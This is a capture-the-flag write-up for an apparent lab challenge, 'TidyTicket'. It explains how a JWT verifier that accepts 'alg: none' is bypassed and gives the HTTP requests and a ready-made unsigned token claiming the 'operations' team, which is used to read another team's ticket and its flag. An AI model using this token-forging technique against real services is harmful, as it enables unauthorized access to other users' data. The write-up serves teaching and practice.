# Writeup — TidyTicket

The board trusts a token that names its own team without proving it:
the verifier accepts `alg: none` and skips the signature entirely.

1. Open the entry page. You see the TidyTicket sign-in form and, on
   the page itself, the demo credentials: team `demo`, password
   `demo`.
2. `POST /login` with form fields `team=demo&password=demo`. You get
   `{"token": "eyJhbGciOi..."}` — a JWT whose three parts are
   base64url(header).base64url(payload).base64url(signature).
3. Decode the first two parts (any base64 decoder). The header says
   `{"alg":"HS256","typ":"JWT"}` and the payload says
   `{"team":"demo",...}` — the team claim is what the API trusts.
4. `GET /api/tickets` with header `Authorization: Bearer <token>`
   lists the demo board. `GET /api/tickets/3` answers
   `403 not your team's ticket` — ticket 3 belongs to operations, and
   its body is the handover note.
5. Forge a token without a signature: header
   `{"alg":"none","typ":"JWT"}`, payload `{"team":"operations"}`,
   encoded as base64url and joined with a dot —
   `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ0ZWFtIjoib3BlcmF0aW9ucyJ9`.
6. `GET /api/tickets/3` with `Authorization: Bearer <forged>` answers
   200 with the operations handover note. Its body contains the flag,
   which looks like `FLAG{...}`.

Why it works: `check_token` reads the algorithm from the attacker-
controlled header. With `alg: none` it trusts the payload's team claim
and never compares a signature, so the "valid token for operations"
was minted by the player, not the server.
